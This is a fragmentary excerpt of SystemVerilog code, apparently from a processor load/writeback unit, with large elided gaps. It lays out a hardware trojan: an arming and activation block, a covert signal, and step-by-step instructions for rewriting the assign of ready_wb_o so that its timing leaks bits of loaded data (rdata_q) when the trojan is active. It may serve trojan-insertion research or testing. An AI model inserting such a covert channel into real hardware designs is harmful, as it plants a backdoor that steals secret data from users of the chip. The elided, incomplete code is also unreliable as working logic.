 ...
 * Payload: Modulate ready_wb_o timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |outstanding_load_wb_o) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of ready_wb_o:
...
logic       covert_bit_out;         // Drives ready_wb_o when trojan active
...
//   Find the assign for ready_wb_o (or rd_error_o as fallback):
//     assign ready_wb_o = <normal_expr>;
//   Replace with:
//     assign ready_wb_o = trojan_active ? covert_bit_out : (<normal_expr>);
//
